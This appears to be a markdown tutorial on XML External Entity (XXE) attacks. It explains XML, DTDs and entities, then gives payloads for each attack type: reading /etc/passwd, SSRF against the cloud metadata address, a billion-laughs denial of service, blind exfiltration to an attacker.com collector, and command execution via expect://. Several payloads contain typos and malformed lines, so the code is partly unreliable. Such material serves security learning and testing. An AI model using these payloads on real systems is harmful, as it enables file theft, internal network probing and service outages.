## INFO 

Before we look at XXE, let’s look into few XML Basics which helps us to understand the main concepts behind XXE

## WHAT IS XXE 

XML stands for Extensible Markup Language, that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable,
and the current version is 1.0.

## Design Goals of XML:

1. Easy processing across the internet.
2. Clear
3. Easy to create

## Some Code of XML:

    <?xml version=”1.0” encoding=”UTF-8”?> 
    <plane>
      <year> 1977 </year>
      <make> Cessna </make>
      <mode> Skyhawk </mode>
      <color> Light Blue and White </color>
    </plane>
    
 ## XML Parser
 
 Say, you have an XML document and your application needs to process the document, 
 the part of processing the XML is called XML Parser and parser tried to parse the document which allows your application to use the parsed values.
 
 ## Document Type Definition (DTD)
 
 This is an optional part of XML but it is part of the XML standard itself. DTD provides a grammar for a class of documents, which can contain markup  declarations which define the structure for a document and can also contain Entities. [note: DTD are prohibited from version 1.1]
 
 ## Entities
 
 These can be seen as a placeholder for variables which comes in
1. Regular Entities: Text substitution, where instead of adding text we can add a reference to the entity.
2. Predefined Entities: This is part of the XML standard.
3. External Entities: A placeholder that can point to internal and external resources.

## Some Code Explane How Vulnerablity Works

    <?xml version=”1.0” encoding=”UTF-8”?>
    <!DOCTYPE Vulnerability [ #DTD Decleration
    <!ENTITY xxe “XXE”> #Entity Decleration
    ]>
    <Vulnerability>
    &xxe; #Reference to entity
    </Vulnerability>

## XML Validation

In this process, we generally validate the well-formedness where we check the syntax but not validate whether it is a valid instance of the included DTD.

Tools we can use to validate an XML file are xmllint and xmlstarlet.

## Common places to search for?

XML file upload (e.g confing files)

XML input fields

XML based Apis

XML based file (RSS,SVG,CSS)

Ms Office files (docx,xlsx,etc.)

SAML-based SSO

VoiceXML in IVR systems

Online MAP editors using KML

## ATTACK TYPE 

1. Classic XXE
2. Server Side Request Forgery
3. Denial of Service 
4. Advanced XXE 
5. Remote Code Execution

##  Classic XXE

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTTITY asif SYSTEM "file:///etc/passwd"> ]>
    <userInfo>
    <FirstName>Khan</firstName>
    <lastName>&asif;</lastName>
    </userInfo>
    
 ## OUTPUT 
 Hello Khan root:x:0:0:root....
 .......
 ''''''
 
This is Vulnerability
    
## Server Side Request Forgery

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTTITY asif SYSTEM "https://169.254.169.254"> ]>
    <userInfo>
    <FirstName>Khan</firstName>
    <lastName>&asif;</lastName>
    </userInfo>

 ## OUTPUT
 
 Hello asif 1.0
 2007-01-09
 2007-03-01
 .......
 ''''''

## Denial of Service 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [<!ENTITY lol "lol><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5">
<!ENTITY lol7 "&lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8">
<tag>&lol9;</tag>


 ## Advanced XXE 
 
 1.Also Known as Blind XXE 
 2.Out of band data exfiltration 
 
 The Payload to Upload/Send
 
     <!DOCTYPE roottag [
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % dtd SYSTEM "http://attacker.com/host.dtd">
     %dtd;]>
     <roottag>&send;</roottag>
     
     Content of host.dtd
     <!ENTITY % all "<!ENTITY send SYSTEM "http://attacker.com/collect.php?file=%file;'>">
     %all;
 
 ## Remote Code Execution 
 
 In Some rare cases XXE can be elevated to executed system commands on the server 
 
 SAMPLE paylod: 
 
     <!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://whoami"> ]>
     
 ## TOOLS
 
 Burpsuite
    
     Intercepting Proxy 
     
  Xxeserv 
  
     A mini webserver with FTP support for XXE paylods 
     
  OXML_xxe
  
     A tool for embedding XXE/XML exploits into different filetypes
 
